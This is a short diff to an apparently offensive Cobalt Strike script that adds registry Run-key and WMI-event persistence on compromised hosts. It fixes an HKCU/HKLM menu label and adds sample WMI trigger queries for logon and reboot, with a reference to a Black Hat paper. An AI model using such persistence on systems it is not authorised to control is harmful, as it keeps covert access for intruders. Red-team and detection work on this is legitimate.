@@ -35,7 +35,7 @@ popup beacon_top {
 					persistRegistryHKCU($bid);
 				}
 			}
-			item "&HKCU Run Key Registry PowerShell Persistence" {
+			item "&HKLM Run Key Registry PowerShell Persistence" {
 				local('$bid');
 				foreach $bid ($1) {
 					persistRegistryHKLM($bid);
@@ -327,6 +327,12 @@ sub persistwmieventwmic {
 #Author: @r3dQu1nn
 #Generates a Custom WMI Event using PowerShell for SYSTEM Level persistence on selected beacon
 #Very syntax heavy, Test first before using on live targets
+#Sample Queries:
+## User Logon:
+#SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2
+## System UpTime (Reboot):
+#SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320
+#https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
 
 sub persistwmievent  {
 	$bid = $1;
